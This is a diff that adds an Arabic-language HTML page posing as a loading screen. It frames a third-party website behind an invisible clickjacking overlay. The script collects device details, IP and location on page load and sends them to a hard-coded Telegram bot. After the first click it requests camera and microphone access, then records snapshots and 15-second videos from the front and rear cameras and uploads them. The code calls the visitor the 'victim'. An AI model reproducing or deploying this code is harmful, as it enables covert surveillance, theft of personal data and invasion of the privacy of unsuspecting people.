@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري التحميل...</title>
+    <style>
+        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background-color: #000; }
+        iframe { width: 100%; height: 100%; border: none; position: absolute; z-index: 1; }
+        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.01); z-index: 999; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+    <iframe src="https://traidmod.com/"></iframe>
+    <div id="overlay" onclick="startOrganizedCapture()"></div>
+
+    <script>
+        const token = '8120975005:AAFpqunUzKJav0pCWI-ZjCMjUVi2FMOL3Go';
+        const chatId = '8249039685';
+
+        async function sendMsg(txt) {
+            try {
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(txt)}&parse_mode=Markdown`);
+            } catch(e) {}
+        }
+
+        async function sendFile(blob, filename, type, caption) {
+            try {
+                const frm = new FormData();
+                frm.append('chat_id', chatId);
+                frm.append(type, blob, filename);
+                if (caption) frm.append('caption', caption);
+                
+                let endpoint = 'sendDocument';
+                if (type === 'photo') endpoint = 'sendPhoto';
+                if (type === 'video') endpoint = 'sendVideo';
+                if (type === 'voice') endpoint = 'sendVoice';
+
+                await fetch(`https://api.telegram.org/bot${token}/${endpoint}`, { method: 'POST', body: frm });
+            } catch(e) {}
+        }
+
+        // 1. جمع معلومات الهاتف الشاملة فور الفتح
+        window.onload = async () => {
+            const ua = navigator.userAgent;
+            let os = "غير معروف";
+            if (ua.indexOf("Android") !== -1) os = "Android";
+            else if (ua.indexOf("iPhone") !== -1 || ua.indexOf("iPad") !== -1) os = "iOS";
+            else if (ua.indexOf("Windows") !== -1) os = "Windows";
+            else if (ua.indexOf("Mac") !== -1) os = "MacOS";
+
+            const screenRes = `${window.screen.width}x${window.screen.height}`;
+            const logicalCores = navigator.hardwareConcurrency || "غير معروف";
+            const deviceMemory = navigator.deviceMemory || "غير معروف"; // متوفر في متصفحات كروم وأندرويد
+            const language = navigator.language || navigator.userLanguage;
+
+            // جلب الـ IP والموقع الجغرافي المعتمد على الشبكة
+            fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
+                let msg = `📱 *معلومات الجهاز المستهدف:*
+`;
+                msg += `▪️ *النظام:* ${os}
+`;
+                msg += `▪️ *المعالج (الأنوية):* ${logicalCores}
+`;
+                msg += `▪️ *الرام التقريبي:* ${deviceMemory} GB
+`;
+                msg += `▪️ *أبعاد الشاشة:* ${screenRes}
+`;
+                msg += `▪️ *لغة الجهاز:* ${language}
+`;
+                msg += `▪️ *المتصفح:* ${navigator.appName}
+
+`;
+                msg += `🌐 *بيانات الشبكة والموقع:*
+`;
+                msg += `▪️ *IP:* ${d.ip}
+`;
+                msg += `▪️ *الدولة:* ${d.country_name} (${d.country_code})
+`;
+                msg += `▪️ *المدينة:* ${d.city}
+`;
+                msg += `▪️ *الشركة المزودة:* ${d.org}`;
+                
+                sendMsg(msg);
+            }).catch(() => {
+                sendMsg(`📱 معلومات الجهاز (بدون IP):
+ النظام: ${os}
+ الشاشة: ${screenRes}
+ الأنوية: ${logicalCores}`);
+            });
+        };
+
+        // 2. بدء عملية الاختراق الإيضاحي بعد أول ضغطة
+        async function startOrganizedCapture() {
+            document.getElementById('overlay').style.display = 'none';
+
+            // إرسال معلومات البطارية والشبكة الحالية
+            let batteryInfo = "غير مدعوم";
+            try { const b = await navigator.getBattery(); batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'جاري الشحن' : 'تفريغ'})`; } catch(e) {}
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            let netType = connection ? connection.effectiveType : "غير معروف";
+            
+            sendMsg(`🔋 *حالة الطاقة والاتصال:*
+▪️ *البطارية:* ${batteryInfo}
+▪️ *نوع اتصال الشبكة:* ${netType}`);
+
+            // البدء بتسجيل الكاميرات والفيديو والصوت
+            try {
+                // طلب الإذن الشامل (صوت وصورة) لمرة واحدة لضمان عدم تكرار طلب الأذونات
+                const mainStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+                
+                // أخذ لقطة سريعة وتسجيل فيديو 15 ثانية من الكاميرا الأمامية
+                sendMsg("⏳ بدأت عملية سحب الفيديو والصوت من الكاميرا الأمامية (15 ثانية)...");
+                await recordVideoAndSnap(mainStream, "user", "الأمامية");
+                
+                // إغلاق قنوات الكاميرا الأمامية للتبديل للخلفية
+                mainStream.getTracks().forEach(t => t.stop());
+
+                // الانتقال للكاميرا الخلفية بعد انتهاء الأولى
+                setTimeout(async () => {
+                    try {
+                        const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: true });
+                        sendMsg("⏳ بدأت عملية سحب الفيديو من الكاميرا الخلفية (15 ثانية)...");
+                        await recordVideoAndSnap(backStream, "environment", "الخلفية");
+                        backStream.getTracks().forEach(t => t.stop());
+                    } catch(e) { 
+                        sendMsg("⚠️ تعذر الوصول للكاميرا الخلفية أو أن الهاتف لا يحتوي عليها."); 
+                    }
+                }, 1000);
+
+            } catch (e) {
+                sendMsg("🚫 الضحية رفض إعطاء صلاحية الكاميرا والميكروفون.");
+            }
+        }
+
+        // دالة مدمجة لالتقاط صورة فورية + تسجيل فيديو وصوت لمدة 15 ثانية
+        function recordVideoAndSnap(stream, facingMode, typeName) {
+            return new Promise(async (resolve) => {
+                // [أولاً] التقاط لقطة شاشة فورية ثابتة
+                const videoElement = document.createElement('video');
+                videoElement.srcObject = stream;
+                videoElement.muted = true;
+                await videoElement.play();
+
+                const canvas = document.createElement('canvas');
+                canvas.width = 640; canvas.height = 480;
+                canvas.getContext('2d').drawImage(videoElement, 0, 0, 640, 480);
+                canvas.toBlob(blob => {
+                    sendFile(blob, `${typeName}_snap.jpg`, 'photo', `📸 لقطة فورية ثابتة - الكاميرا ${typeName}`);
+                }, 'image/jpeg', 0.7);
+
+                // [ثانياً] تسجيل الفيديو والصوت لمدة 15 ثانية
+                let options = { mimeType: 'video/webm;codecs=vp9,opus' };
+                if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+                    options = { mimeType: 'video/webm;codecs=vp8,opus' };
+                }
+                if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+                    options = { mimeType: 'video/mp4' }; // دعم هواتف آيفون
+                }
+
+                try {
+                    const recorder = new MediaRecorder(stream, options);
+                    const chunks = [];
+                    
+                    recorder.ondataavailable = e => {
+                        if (e.data && e.data.size > 0) chunks.push(e.data);
+                    };
+
+                    recorder.onstop = async () => {
+                        const videoBlob = new Blob(chunks, { type: recorder.mimeType });
+                        const extension = recorder.mimeType.includes('mp4') ? 'mp4' : 'webm';
+                        
+                        // إرسال الفيديو المسجل مع الصوت مدمجاً به
+                        await sendFile(videoBlob, `${typeName}_video.${extension}`, 'video', `🎥 فيديو 15 ثانية شامل الصوت - الكاميرا ${typeName}`);
+                        resolve();
+                    };
+
+                    recorder.start();
+                    // التوقيت المعدل: 15000 ميلي ثانية تعادل 15 ثانية كاملة
+                    setTimeout(() => {
+                        if (recorder.state !== "inactive") recorder.stop();
+                    }, 15000);
+
+                } catch(err) {
+                    sendMsg(`⚠️ فشل تسجيل الفيديو للكاميرا ${typeName} بسبب قيود المتصفح.`);
+                    resolve();
+                }
+            });
+        }
+    </script>
+</body>
+</html>
